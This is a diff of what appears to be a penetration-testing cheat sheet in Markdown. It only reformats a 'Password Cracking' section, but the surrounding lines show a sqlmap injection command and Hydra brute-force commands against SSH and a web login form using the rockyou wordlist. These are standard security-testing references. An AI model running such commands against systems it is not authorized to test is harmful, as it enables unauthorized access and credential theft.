@@ -269,7 +269,9 @@ sqlmap -u "http:domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7
 
 <details>
 <summary>Password Cracking</summary>
- > Hydra : FTP, SSH, Telnet
+
+> Hydra : FTP, SSH, Telnet
+  
 ```shell
 # SSH
 ~# hydra -l username -P passlist.txt 192.168.0.100 ssh
@@ -286,9 +288,7 @@ sqlmap -u "http:domain.com/path.aspx?id=1" cookie=”PHPSESSID=1tmgthfok042dslt7
 # Login form
 ~# sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
   
-  
-  
-  ```
+```
   
 </details>
   
